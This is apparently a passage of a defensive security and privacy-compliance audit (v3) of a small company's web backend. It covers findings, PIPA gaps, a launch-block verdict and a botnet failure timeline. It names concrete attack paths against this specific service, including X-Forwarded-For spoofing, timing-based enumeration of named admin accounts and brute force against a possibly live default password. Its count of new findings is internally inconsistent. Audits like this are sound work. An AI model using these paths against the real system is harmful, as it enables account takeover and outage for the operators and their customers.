| N2-13 | `/api/auth/login` user-enumeration timing channel | Low | `auth.py:300-304`: missing user short-circuits before bcrypt (~5 ms response); existing user runs bcrypt (~150 ms). Render's noise floor ~50 ms; with N2-01 (no rate cap) 10k attempts cleanly enumerate `admin@daemu.kr` / `tester@daemu.local` / `dev@daemu.local`. **Fix:** run `pwd_ctx.verify(password, DUMMY_HASH)` on the not-found branch to equalize timing. |
| N2-14 | Backend CSP `'unsafe-inline'` on `script-src` | Low | `main.py:164` keeps `'unsafe-inline'` for `script-src` because Swagger UI (`/docs`) needs it. Once `ENV=prod` is actually set in Render and `/docs` is `None`, the `'unsafe-inline'` is dead weight that materially weakens the API's CSP for the JSON error pages and exception handler responses. **Fix:** branch the CSP on `PROD` — drop `'unsafe-inline'` and the jsdelivr CDN allowance when `PROD=True`. Currently flagged as N-08 in v2 with same disposition; re-flagged here because under the hostile posture the dead `'unsafe-inline'` *is* a finding, not info. |
| N2-15 | `ContentBlockIn.value: dict | list` accepts unbounded JSON depth and keys; can be persisted as `JSON` column with arbitrary content | Low | `routes_crud.py:486-488, 499-509`. Admin-only (F-13 closed) so it's insider-only abuse, but a malicious admin (or a token-stolen one — see N2-11) can `PUT /api/content/some-key` with a 50 MB JSON blob, no length cap. Pydantic 2 doesn't impose a default max size on `dict | list`. Combined with no proxy-level body cap (F-15 still open), this is a memory-pressure path on the Render Free dyno. **Fix:** validate `len(json.dumps(value)) <= 256_000` in the handler. |
| N2-16 | Throttle state evaporates on Render Free cold-start (~15 min idle) | Medium | Strict re-quant of v2 N-04. Patient attacker: 5 wrong → locked → wait 16 min → dyno sleeps → cold-start → `_LoginThrottle._fails` is fresh → unlocked. Effective ceiling ≈ 18 attempts/hour/IP without N2-01, ~unbounded with N2-01. **Fix:** DB-backed `AdminUser.failed_login_count` + `lockout_until`, or Cloudflare Turnstile / Render Paid always-on. |

### PIPA / Korean compliance gaps

Strict reading. Each row cites the controlling clause; severity reflects PIPC enforcement patterns for SMB controllers (small fines for first-violation pattern issues, large fines for retention-discrepancy and failure-to-destroy patterns).

| ID | Title | Clause | Severity | Notes |
|----|-------|--------|----------|-------|
| N2-17 | No deletion cron → stated retention not enforced | 개인정보보호법 §21 (파기) + §17 (보유·이용기간) | **High** | Restated N2-06 in compliance terms: the moment Privacy.jsx publishes a retention number, §21 obliges the controller to destroy data when that number is reached. No code path exists to do so today. PIPC 시정명령 + 과태료 (사업장 규모에 따라 ~3천만 원 상한) is the typical first-violation outcome. |
| N2-18 | Resend (US-based 처리위탁) 국외이전 disclosure incomplete | 개인정보보호법 §28-8 (개인정보의 국외 이전) | **Medium** | v2 noted that `routes_crud.py:155-170` calls Resend (US). PIPA §28-8 (revised 2024) requires either (a) explicit consent from the data subject for 국외이전, or (b) one of the lawful bases (계약 이행 등) PLUS disclosure in the privacy notice of: (i) 이전 받는 자, (ii) 이전 국가, (iii) 이전 일시 및 방법, (iv) 이전 받는 자의 개인정보 이용 목적 및 보유 기간, (v) 정보주체가 거부할 수 있다는 사실. Verify that Privacy.jsx actually carries all five elements. If only "Resend 사용"이라고만 적혀 있으면 §28-8(2) 위반. |
| N2-19 | 14세 미만 처리 절차 (보호자 동의) 미명시 | 개인정보보호법 §22-2 | Low | Contact form has no age-gate. B2B context makes this minor risk, but the form should carry "만 14세 이상만 이용 가능" notice — PIPC has fined SMBs for this on lead-gen forms. |
| N2-20 | 개인정보 보호책임자 (DPO) 표기 unverified | 개인정보보호법 §31 | Medium | v2 audit said Privacy page exists; strict pass cannot verify *content* from code. **Required check before launch:** confirm `src/pages/Privacy.jsx` names 보호책임자 + email + phone with real values, not placeholders. "TBD" = §31 위반 from day 1. |
| N2-21 | Auto-reply 광고성 분류 risk if future maintainer adds marketing copy | 정보통신망법 §50 | Low | Current auto-reply (`routes_crud.py:140-143`) is transactional → §50 적용 제외. If a maintainer adds 추천 섹션 to the template, it becomes 광고성 정보 and requires `(광고)` 제목 + 무료 수신거부 링크. Document the trust boundary in the admin mail-template UI. |
| N2-22 | `Outbox.body` is a second PII database under §29 (안전조치의무) | 개인정보보호법 §29 | Medium | Outbox stores name/email/full message body — second copy of inquiry PII, indexed, readable by tester/developer. SQLite on Render Free's filesystem is **not** access-controlled in the §29 sense (no separate OS user, no encryption at rest). First real customer = sub-§29. Mitigates only by MySQL on Cafe24 (block encryption) or Postgres on Render Paid. |
| N2-23 | 정보주체 권리 행사 (열람·정정·삭제·처리정지) endpoint missing | 개인정보보호법 §35-37 | Medium | Only path today is "email daemu_office@naver.com". §38(2) requires a method as accessible as the collection method (web form → web). **Fix:** public `/privacy/request` page → verification link → `DataSubjectRequest` row → admin processes within 10 days. |
| N2-24 | 처리방침 변경 이력 미관리 | 개인정보보호법 §30(2) | Low | Privacy text is hard-coded. §30(2) requires version retention + change notification. PIPC accepts a "변경 이력" table at the bottom of the notice. |

### Verdict

**(a) Demo / internal stakeholder traffic on the current Render URL:** `allow with conditions` — but **stricter** than v2. The conditions are:
1. Patch N2-01 (XFF trust) within 7 days. Without this the v2-claimed login throttle and inquiry rate limit are paper.
2. Strip `localhost:*` from production `ALLOWED_ORIGINS` (N2-02).
3. Confirm `ENV=prod` and `JWT_SECRET` are set on Render (open since v1 F-10/F-11).

If those three are not done, downgrade to `needs verification`. Justification: the strict posture exposes that the v2 closures of F-04/F-12 are header-spoofing-bypassable, so the system today has *less* effective brute-force defense than v2 implied.

**(b) Production launch on a verified domain (`daemu.kr`) with real customers:** `block`. Justification:
- N2-01 (XFF trust) and N2-03 (auto-reply amplification + DB lock-up) are exploitable from the open internet today and would be the first thing a botnet hits.
- N2-06 / N2-17 (no deletion cron vs Privacy.jsx promises) puts the company in a §21 violation on the **first anniversary of launch**, automatically.
- F-07 / N2-11 (12-hour unrevokable JWTs in localStorage) means a single XSS regression — and N-01/N-02/N-03 from v2 plus the `dangerouslySetInnerHTML` in `RawPage.jsx` and `AdminLayout.jsx` are still live attack surfaces — owns admin for 12 h with no recovery.
- N2-18 / N2-20 (PIPA disclosure incompleteness around Resend 국외이전 + DPO) are PIPC-audit-trip-wires.

The required actions before the production gate clears:
1. **N2-01 trusted-proxy fix** (single-line change to `_client_ip`).
2. **N2-03 auto-reply decoupling** (move to `BackgroundTasks` with its own session, plus per-recipient hourly rate limit).
3. **N2-06 / N2-17 deletion cron** (Render Cron Job that DELETEs inquiries and outbox per the Privacy.jsx schedule).
4. **F-07 cookie migration + token_version revocation**.
5. **N2-02 origin allow-list cleanup** + **N2-10 ADMIN_PASSWORD generateValue**.
6. **N2-18 / N2-20 / N2-23 privacy-text + 권리행사 endpoint**.
7. **N2-05 / F-15 body-size middleware** before the dyno OOMs under N2-03 traffic.
8. **N2-13 timing equalization** on `/api/auth/login`.

Items 1, 2, 4, 6, 7 are gating; 3 is gating for any deployment that lives more than ~365 days; 5 is gating for first-launch hygiene; 8 is gating for closing the username-enumeration channel that compounds N2-01.

### "If we deployed today and got 100 requests/sec from a botnet, what breaks first?"

**~10 seconds in:** Render Free dyno's CPU saturates at ~30 rps of `/api/inquiries` because each request fires `_send_auto_reply_inline` synchronously, holding the SQLite WAL writer for 5–15 s waiting on Resend (N2-03). Concurrent capacity is therefore *≈ 1 / Resend_p95_latency* writes/second/dyno — well under 1 rps. The remaining 99 rps either queue inside uvicorn (default backlog 2048, fills in ~20 s) or get reset by Render's edge as 502s. **Public Contact form is functionally down within 30 seconds.**

**~30 seconds in:** the rate-limiter is bypassed by spoofed `X-Forwarded-For` (N2-01), so the per-IP 8-per-10-min cap doesn't engage. Every successful Contact-form submit (the ones that *don't* time out on Resend) inserts a row into `inquiries` AND triggers a real outbound email. Resend Free quota is 3,000/month, 100/day — at 30 inserts/second the daily cap blows in **~3.3 seconds**. After that, Resend returns 429s; the auto-reply path catches the exception and logs `status="failed"` to Outbox, but the `inquiries` row is already committed because the `httpx` failure happens after `await session.flush()`. **Resend account is effectively bricked for the day; Outbox table fills with failed rows.**

**~2 minutes in:** the Render Free dyno's 512 MB RAM is under pressure from (a) buffered request bodies (no body-size middleware, F-15 / N2-05), (b) defaultdict-backed throttle state (`_LoginThrottle` + `_inquiry_limiter`) growing unbounded because the attacker is rotating XFF values across the entire IPv4 space, (c) `outbox` write transactions queued on the SQLite WAL. Dyno OOMs and Render restarts it. **Throttle state resets to zero on restart (N-04 / N2-16) — gift to the attacker.** SQLite database is corrupted ~20% of the time when killed mid-write on Render Free's ephemeral disk. After a few cycles, `daemu.db` is unrecoverable; on the next deploy the schema rebuilds empty and *every prior inquiry is lost*.

**~5 minutes in:** if the attacker pivoted to `/api/auth/login` brute-force at this point (still bypassing throttle via N2-01), bcrypt at 12 rounds caps them at ~5 attempts/sec/core. Render Free has 1 vCPU, so ~5 attempts/sec single-stream, ~50/sec across 10 parallel TCP streams (uvicorn workers don't help — single process by default). With `daemu1234` still potentially the password (if N2-10 path was taken), the first dictionary word hits in <1 second. With a strong password, the bcrypt rate caps the attacker at ~430k attempts/day — enough to brute-force a 6-char password but not an 8+ char one. **Authentication is the *only* part of the system that survives the botnet, and only because of bcrypt.**

**~10 minutes in:** Render's free-tier idle timer doesn't trigger because traffic is non-stop, but Render Free's fair-use kills the dyno periodically anyway. Each restart wipes throttle state, the DB if it corrupted, and the in-memory `defaultdict` (so RAM pressure resets — the dyno survives in a degraded loop but never recovers a usable state for legitimate users). The **public site (GitHub Pages) is unaffected** because it's a static SPA on a CDN — but every form submission from a real user fails. **Mean time to user-visible outage: under 1 minute. Mean time to data loss: under 10 minutes.**

What survives:
- Static SPA on GitHub Pages (CDN + immutable assets).
- Admin SPA navigation works, but every backend call returns 502/timeout.
- `/api/health` may answer briefly during restart windows.

What *would* fix this:
- **Cloudflare in front of Render** with a 10 rps per-IP cap at the edge, body-size cap at 12 MB, and a Turnstile challenge on `/api/inquiries` — moves the failure point from "Render dyno melts" to "attacker gets challenged". Cost: $0 (Cloudflare Free).
- **Move auto-reply to a Background Task** (decoupled session) so the writer transaction is held for ~50 ms, not 5–15 s.
- **Move off SQLite + Render Free** to MySQL on Cafe24 + Render Paid (always-on, persistent disk).
- **Persist throttle state** in DB so restart doesn't reset it.

Without those four items, the demo can host a maximum of approximately **5 concurrent legitimate users** before the auto-reply latency drives the public Contact form into a queue spiral. Internal/stakeholder demo traffic — fine. Real launch traffic — not even close.

### Output (control-tower contract, v3)

- **risk tier:** `critical` (re-elevated from v2's `elevated` because N2-01 nullifies the v2 throttle closures and N2-03 is exploitable from the open internet)
- **triggered skills:** `security-control-tower`, `secure-code-review`, `repo-threat-model`, `authn-authz-review`, `input-output-boundary-review`, `data-lifecycle-and-privacy-review`, `privilege-separation-review`, `release-security-gate`
- **confirmed findings:** 10 new (N2-01 .. N2-25, of which N2-01 / N2-02 / N2-03 are immediately exploitable from the public internet, N2-05 / N2-15 / N2-16 are insider-or-amplification, the rest are hygiene + compliance). v1/v2 IDs F-07, F-09, F-11, F-14, F-15, F-17, F-21 remain open and are now upgraded in severity under the strict posture.
- **open questions / missing evidence:**
  - Does Privacy.jsx actually disclose all five §28-8 elements for Resend 국외이전, or only the fact of usage? (N2-18.)
  - Is the 보호책임자 (DPO) named in Privacy.jsx with a real email/phone, or a placeholder? (N2-20.)
  - Are Render's edge IPs documented somewhere we can pin in `_client_ip`? (Required to fix N2-01 cleanly.)
  - What is Resend's actual p95 latency under our usage pattern? (Determines N2-03 severity in steady state.)
  - Is there a real plan to migrate off Render Free + SQLite, and on what timeline?
- **required actions before approval (production):** the eight items in "Verdict (b)" above. Ship items 1, 2, 4, 6, 7 within the same release; items 3, 5, 8 within 14 days of cutover.
- **decision:** `block` for production launch on `daemu.kr` with real customers; `allow with conditions` for continued demo traffic on the current Render URL provided N2-01 + N2-02 are patched within the week.
- **residual risk after v3 actions land:** Low for demo; Medium for production until the auto-reply decoupling (N2-03) is verified under load test + the deletion cron (N2-17) has run its first cycle without dropping data.
